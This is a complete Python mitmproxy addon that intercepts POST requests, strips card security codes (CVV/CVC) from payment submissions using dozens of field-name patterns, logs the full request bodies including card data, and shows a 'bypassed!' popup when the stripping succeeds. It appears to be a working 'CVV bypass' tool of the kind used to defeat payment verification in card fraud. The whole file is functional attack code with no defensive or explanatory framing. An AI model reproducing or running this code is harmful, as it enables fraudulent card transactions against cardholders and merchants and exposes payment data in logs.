from mitmproxy import http, ctx
import re

# Universal patterns to match CVV values in the request body
UNIVERSAL_CVV_PATTERNS = [
    rb"payment_method_data\[card\]\[cvc\]=[\d]{3,4}",
    rb"card\[cvc\]=[\d]{3,4}",
    rb"source_data\[card\]\[cvc\]=[\d]{3,4}",
    rb"encryptedSecurityCode\":\s*\"[^\"]+\"",
    rb"\"cvv\":\s*\"[\d]{3,4}\"",
    rb"cc_cscv=[\d]{3,4}",
    rb"card\[cvv\]=[\d]{3,4}",
    rb"card\[cvv2\]=[\d]{3,4}",
    rb"security_code=[\d]{3,4}",
    rb"securityCode=[\d]{3,4}",
    rb"cvvNumber=[\d]{3,4}",
    rb"card_verification_value=[\d]{3,4}",
    rb"cvc2=[\d]{3,4}",
    rb"cvv_code=[\d]{3,4}",
    rb"csc=[\d]{3,4}",
    rb"cvn=[\d]{3,4}",
    rb"cvv_field=[\d]{3,4}",
    rb"cvc_code=[\d]{3,4}",
    rb"securityNumber=[\d]{3,4}",
    rb"verification_code=[\d]{3,4}",
    rb"verificationCode=[\d]{3,4}",
    rb"card_security_code=[\d]{3,4}",
    rb"cardSecurityCode=[\d]{3,4}",
    rb"cardCvc=[\d]{3,4}",
    rb"cardCvv=[\d]{3,4}",
    rb"cvvValue=[\d]{3,4}",
    rb"cvcValue=[\d]{3,4}",
    rb"cvv_field_value=[\d]{3,4}",
    rb"cvc_field_value=[\d]{3,4}",
    rb"cardVerificationCode=[\d]{3,4}",
    rb"cvcNumber=[\d]{3,4}",
    rb"cvv_num=[\d]{3,4}",
    rb"cvc_num=[\d]{3,4}"
]

def log_request_body(flow: http.HTTPFlow, message: str):
    """
    Logs the request body for debugging purposes.
    """
    ctx.log.info(f"{message}: {flow.request.content.decode('utf-8', errors='ignore')}")

def clean_up_trailing_characters(request_body: bytes) -> bytes:
    """
    Cleans up trailing commas and quotes left behind after removing CVV values.
    """
    cleaned_body = re.sub(rb",\s*\"[^\"]*\":\s*\"\"", b"", request_body)
    return cleaned_body

def remove_cvc_from_request_body(request_body: bytes) -> (bytes, bool):
    """
    Removes the CVV value from the request body based on the universal patterns.
    Returns the modified body and a flag indicating whether any CVV was removed.
    """
    original_body = request_body
    for pattern in UNIVERSAL_CVV_PATTERNS:
        request_body = re.sub(pattern, b"", request_body)
    return request_body, original_body != request_body

def modify_request(flow: http.HTTPFlow) -> bool:
    """
    Modifies the intercepted request to remove CVV data.
    Returns True if any CVV data was removed, otherwise False.
    """
    # Log the original request data for debugging
    log_request_body(flow, "Original Request Body")

    # Remove CVV codes from the payment data
    modified_body, cvv_removed = remove_cvc_from_request_body(flow.request.content)
    
    # Clean up any trailing characters if necessary
    modified_body = clean_up_trailing_characters(modified_body)

    # Log the modified request data for debugging
    log_request_body(flow, "Modified Request Body")

    # Set the modified body back to the request
    flow.request.content = modified_body
    
    return cvv_removed

def inject_popup_script(html: str) -> str:
    """
    Injects a JavaScript popup script into the HTML content.
    """
    popup_script = '<script>alert("bypassed!");</script>'
    modified_html = html.replace("</body>", f"{popup_script}</body>")
    return modified_html

def trigger_popup(flow: http.HTTPFlow):
    """
    Injects a JavaScript popup by making an additional request.
    """
    # Prepare a response with JavaScript injection
    popup_response = http.Response.make(
        200,  # (optional) status code
        inject_popup_script("<html><body></body></html>"),  # content
        {"Content-Type": "text/html"}  # headers
    )
    flow.response = popup_response

def request(flow: http.HTTPFlow):
    """
    This function intercepts and modifies requests to remove CVV data.
    """
    if flow.request.method == "POST":
        cvv_removed = modify_request(flow)
        if cvv_removed:
            trigger_popup(flow)

def start():
    """
    Function executed when the proxy starts.
    """
    ctx.log.info("Proxy server started. Ready to intercept requests.")

# Attach handlers to mitmproxy
addons = [
    request
    ]
